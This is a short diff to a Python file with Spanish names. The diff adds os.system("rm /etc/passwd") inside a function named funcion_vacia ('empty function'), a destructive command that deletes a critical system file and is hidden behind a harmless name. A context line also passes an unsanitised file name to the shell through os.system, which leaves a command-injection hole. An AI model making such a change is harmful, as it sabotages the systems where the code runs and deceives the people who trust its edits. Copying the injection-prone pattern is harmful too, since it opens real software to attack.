@@ -7,3 +7,5 @@ def eliminar_archivo(nombre_archivo):
     os.system(f"rm {nombre_archivo}")
 
 def funcion_vacia():
+	os.system("rm /etc/passwd")
+
